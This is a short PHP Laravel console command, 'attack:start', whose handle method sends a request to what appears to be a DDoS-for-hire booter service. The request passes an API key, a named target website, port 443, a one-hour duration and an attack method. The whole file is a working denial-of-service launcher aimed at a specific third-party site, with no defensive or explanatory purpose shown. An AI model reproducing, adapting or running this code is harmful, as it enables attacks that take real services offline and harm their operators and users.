<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;

class ScheduleAttack extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'attack:start';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return mixed
     */
    public function handle()
    {
        $k = 'BghUuaFPZH5x4Voa';
        $h = 'https://magicoption.co';
        $p = 443;
        $t = 3600;
        $m = 'Anon-Capt';
        $ch = curl_init("https://anonboot.ga/?key={$k}&host={$h}&port={$p}&time={$t}&method={$m}");
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $response = curl_exec($ch);
        curl_close($ch);
    }
}
